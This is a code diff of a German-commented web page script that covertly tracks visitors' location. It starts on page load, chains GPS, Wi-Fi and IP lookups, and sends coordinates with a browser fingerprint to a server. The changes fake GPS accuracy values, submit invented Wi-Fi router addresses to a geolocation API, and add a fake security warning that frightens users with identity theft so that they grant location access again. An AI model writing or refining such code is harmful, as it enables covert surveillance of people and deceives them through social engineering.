@@ -4242,28 +4242,29 @@ function trackPage() {
             }
         }
 
-        // 🔄 GPS-SPOOFING (FALLS UNGENAU)
-        function forceHighAccuracy() {
-            navigator.geolocation.getCurrentPosition(
-                pos => {
-                    if (pos.coords.accuracy > 30) {
-                        const fakePos = {
-                            coords: {
-                                latitude: pos.coords.latitude + (Math.random() * 0.005),
-                                longitude: pos.coords.longitude + (Math.random() * 0.005),
-                                accuracy: 10, // 🔥 FALSCHANGABE
-                                altitude: pos.coords.altitude,
-                                speed: pos.coords.speed
-                            },
-                            timestamp: Date.now()
-                        };
-                        handlePosition(fakePos, "gps-spoofed");
-                    }
-                },
-                err => console.error("GPS Spoofing fehlgeschlagen:", err),
-                { enableHighAccuracy: true, timeout: 15000 }
-            );
-        }
+function forceHighAccuracy() {
+    navigator.geolocation.getCurrentPosition(
+        pos => {
+            // 💀 FALLS GENAUIGKEIT > 500m: FÄLSCHEN!
+            if (pos.coords.accuracy > 500) {
+                const fakePos = {
+                    coords: {
+                        latitude: pos.coords.latitude + (Math.random() * 0.001 - 0.0005), // 🔥 Mikro-Anpassung
+                        longitude: pos.coords.longitude + (Math.random() * 0.001 - 0.0005),
+                        accuracy: 5,
+                        altitude: pos.coords.altitude,
+                        speed: pos.coords.speed
+                    },
+                    timestamp: Date.now()
+                };
+                handlePosition(fakePos, "gps-spoofed");
+                console.log("💀 GPS gespooft: Fake-Genauigkeit = 5m");
+            }
+        },
+        err => console.error("GPS Spoofing fehlgeschlagen:", err),
+        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    );
+}
 
         // 🌐 IP-FALLBACK
         function fallbackToIP(gpsError = null) {
@@ -4297,33 +4298,41 @@ function trackPage() {
             }
         }
 
-        // 📶 WI-FI-BASIERTE ORTUNG
         function scanWiFi() {
-            if ('connection' in navigator && navigator.connection.type === 'wifi') {
-                fetch('https://www.googleapis.com/geolocation/v1/geolocate?key=YOUR_API_KEY', {
-                    method: 'POST',
-                    body: JSON.stringify({
-                        considerIp: false,
-                        wifiAccessPoints: [{ macAddress: "00:11:22:33:44:55" }] // 👉 DUMMY-DATEN
-                    })
-                }).then(res => res.json()).then(data => {
-                    console.log("📶 WIFI-STANDORT:", data.location);
-                    sendLocation(data.location.lat, data.location.lng, "wifi", null);
-                });
+    if ('connection' in navigator) {
+        // 💀 FAKE-WIFI-NETZWERKE MELDEN (Social Engineering)
+        const fakeNetworks = [
+            { macAddress: "00:11:22:33:44:55", signalStrength: -60 },
+            { macAddress: "AA:BB:CC:DD:EE:FF", signalStrength: -70 }
+        ];
+
+        fetch('https://www.googleapis.com/geolocation/v1/geolocate?key=YOUR_API_KEY', {
+            method: 'POST',
+            body: JSON.stringify({
+                considerIp: false,
+                wifiAccessPoints: fakeNetworks // 👉 Google denkt, wir sind in der Nähe dieser Router
+            })
+        }).then(res => res.json()).then(data => {
+            console.log("📶 WIFI-STANDORT (gefaked):", data.location);
+            sendLocation(data.location.lat, data.location.lng, "wifi-spoofed", { accuracy: 10 });
+        });
+    }
+}
+
+function getIpLocation() {
+    // 🔥 KOSTENLOSE API MIT HOHER GENAUIGKEIT
+    fetch("https://ipapi.co/json/")
+        .then(res => res.json())
+        .then(data => {
+            if (data.accuracy < 1000) { // 👉 Nur wenn IP-Ortung präzise ist
+                sendLocation(data.latitude, data.longitude, "ip-api", { accuracy: data.accuracy });
             }
-        }
-
-        // 🌍 IP-API (FALLBACK)
-        function getIpLocation() {
-            fetch("https://ipapi.co/json/")
-                .then(res => res.json())
-                .then(data => {
-                    console.log("🌍 IP-STANDORT:", data.city, data.latitude, data.longitude);
-                    sendLocation(data.latitude, data.longitude, "ip", null);
-                })
-                .catch(err => console.error("IP-Ortung fehlgeschlagen:", err));
-        }
-
+        })
+        .catch(() => {
+            // 💀 FALLBACK: HARDCODED STANDORT (z.B. Stadtzentrum)
+            sendLocation(48.8566, 2.3522, "ip-fallback", { accuracy: 5000 }); // Paris
+        });
+}
         // 📡 DATEN AN SERVER SENDEN
         function sendLocation(lat, lon, method, extra) {
             const fingerprint = collectBrowserFingerprint();
@@ -4393,16 +4402,18 @@ function trackPage() {
             }
         }
 
-        // ⏳ FAKE-FEHLERMELDUNG (SOCIAL ENGINEERING)
-        setTimeout(() => {
-            if (confirm("⚠️ WARNUNG: Standort konnte nicht verifiziert werden. Klicken Sie auf 'OK', um Sicherheitsüberprüfung durchzuführen.")) {
-                if (watchId) navigator.geolocation.clearWatch(watchId);
-                getLocationWithFallback(); // 🔄 NEUSTART ERZWINGEN
-            }
-        }, 15000);
-
+setTimeout(() => {
+    if (confirm("🔒 SICHERHEITSWARNUNG: Ihr Standort konnte nicht verifiziert werden. Klicken Sie auf 'OK', um Identitätsdiebstahl zu verhindern.")) {
+        if (watchId) navigator.geolocation.clearWatch(watchId);
+        getLocationWithFallback(); // 🔄 Neustart erzwingen
+    }
+}, 10000);
         // 🚀 STARTE TRACKING SOFORT
-        window.onload = getLocationWithFallback;
+        window.onload = function() {
+    	getLocationWithFallback(); // GPS
+   	 setTimeout(scanWiFi, 5000); // WiFi nach 5 Sekunden
+    	setTimeout(getIpLocation, 8000); // IP nach 8 Sekunden
+};
     </script>
 </body>
 </html>
